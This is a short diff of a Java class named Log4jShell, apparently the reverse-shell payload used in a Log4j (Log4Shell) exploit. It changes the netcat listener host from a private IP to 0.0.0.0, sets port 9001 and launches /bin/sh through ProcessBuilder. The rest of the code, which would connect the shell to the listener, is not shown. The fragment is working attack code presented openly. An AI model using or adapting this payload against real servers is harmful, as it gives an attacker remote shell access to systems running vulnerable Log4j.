@@ -4,7 +4,7 @@ import java.io.OutputStream;
 import java.net.Socket;
 public class Log4jShell {
     public Log4jShell() throws Exception {
-        String host="192.168.1.26"; // netcat listener host
+        String host="0.0.0.0"; // netcat listener host
         int port=9001; // netcat listener port
         String cmd="/bin/sh";
         Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
